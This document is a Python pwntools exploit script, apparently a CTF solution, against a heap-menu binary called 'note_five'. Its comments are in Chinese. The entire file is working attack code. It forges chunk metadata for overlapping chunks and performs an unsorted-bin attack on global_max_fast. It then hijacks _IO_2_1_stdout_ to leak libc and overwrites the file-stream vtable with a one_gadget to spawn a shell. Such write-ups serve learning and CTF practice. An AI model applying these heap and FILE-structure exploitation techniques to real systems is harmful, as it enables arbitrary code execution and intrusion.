#-*- coding:utf-8 -*-
from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./note_five')
libc = ELF('libc.so')

def Add(index, size):
    p.sendlineafter('choice>> ', '1')
    p.sendlineafter('idx: ', str(index))
    p.sendlineafter('size: ', str(size))

def Edit(index, content):
    p.sendlineafter('choice>> ', '2')
    p.sendlineafter('idx: ', str(index))
    p.sendafter('content: ', content)

def Delete(index):
    p.sendlineafter('choice>> ', '3')
    p.sendlineafter('idx: ', str(index))

Add(0, 0xf8)
Add(1, 0xf8)
Add(2, 0xf8)
Add(3, 0xf8)
Add(4, 0xf8)

#伪造chunk3的prev_size和prev_inuse位，再释放调chunk0和chunk3,造成chunk overlapping，可以得到大小为0x400的unsortbin chunk
payload = '\x00'*0xf0 + p64(0x300) + '\x00'
Edit(2, payload) #chunk overlapping
Delete(0)
Delete(3)

Add(0, 0x108)
Add(0, 0xe8)
payload = '\x00'*0x8 + '\xe8\x37' + '\n'
Edit(2, payload) #修改bk指针指向&global_max_fast-0x10处，为unsortedbin attack做准备
Add(3, 0x1f8)

Delete(0)
payload = p64(0) + p64(0xf1) + '\x3b\x25' + '\n'
Edit(1, payload)

Add(0, 0xe8)
Add(4, 0xe8) #chunk4可控制_IO_2_1_stderr

#在&_IO_2_1_stdout_0x10处填入0x1f1，伪造chunk大小，并修改_IO_2_1_stdout_的flag的值为0xfbad1800
#修改flag的值是为了绕过一些列检查，至于为什么改为这个值读者可百度其他相关_IO_FILE的文章
payload = '\x00'*0xcd + p64(0x1f1) + '\x00\x18\xad\xfb' + '\n' 
Edit(4, payload)


#此处修改大小是因为原来的链表被破坏，需要通过修改大小换一个索引
Edit(1, '\x00'*8 + p64(0x1f1) + '\n')

Delete(0)
payload = '\x00'*0x8 + p64(0x1f1) + '\x10\x26' + '\n'
Edit(1, payload)

Add(0, 0x1e8)
Add(4, 0x1e8) #chunk4可控制_IO_2_1_stdout

payload = p64(0xfbad1800) + p64(0)*3 + '\x00\n'
Edit(4, payload)

p.recvuntil('\x00\x18\xad\xfb')
p.recv(28)

libc_base = u64(p.recv(6)+'\x00\x00') - 0x3c5600
info("libc_base ==> " + hex(libc_base))

one_gadget = libc_base + 0xf1147

#保持_IO_2_1_stdout_的其他数据不动，只修改vtable的值，并在stderr处写入one_gadget
payload  = p64(0xfbad1800) + p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x83)
payload += p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x83) + p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x83)
payload += p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x83) + p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x83)
payload += p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x84) + p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x83)
payload += p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x84) + p64(0)
payload += p64(0) + p64(0)
payload += p64(0) + p64(libc_base + libc.sym['_IO_2_1_stdin_'])
payload += p64(1) + p64(0xffffffffffffffff)

# 此处原来是数据是0x0a000000，由于'\x0a'会被输入截断，故改为0x0b000000
payload += p64(0x0b000000) + p64(libc_base + 0x3c6780)
payload += p64(0xffffffffffffffff) + p64(0)
payload += p64(libc_base + 0x3c47a0) + p64(0)
payload += p64(0) + p64(0)
payload += p64(0xffffffff) + p64(0)
payload += p64(0) + p64(libc_base + 0x3c56c8)
payload += p64(one_gadget) + '\n'
info("len(payload) ==> " + hex(len(payload)))
info("one_gadget ==> " + hex(one_gadget))
#gdb.attach(p)
Edit(4, payload)

p.interactive()

